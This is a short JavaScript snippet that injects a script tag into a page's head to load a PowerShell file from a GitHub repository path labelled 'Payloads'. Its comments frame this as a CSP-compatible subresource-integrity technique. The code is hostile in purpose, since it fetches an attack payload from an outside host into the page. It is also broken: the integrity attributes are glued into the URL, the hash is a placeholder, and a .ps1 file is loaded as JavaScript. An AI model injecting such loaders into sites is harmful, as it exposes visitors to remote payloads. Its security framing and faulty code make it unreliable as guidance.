// Use a Content Security Policy (CSP) compatible approach by utilizing subresource_integrity
// Note that you will need to generate an SRI hash specific to your script content. This example uses a placeholder hash.
var url = 'https://raw.githubusercontent.com/cmndcntrlcyber/one-attck-per-time/main/Payloads/pwsh/WonTonPlatypus.ps1'; // Replace with the actual path to your executable file on the web server
var scriptTag = document.createElement('script');
scriptTag.src = url + ' integrity="sha384-(PLACEHOLDER_FOR_SRI_HASH)" crossorigin="anonymous"';
document.head.appendChild(scriptTag);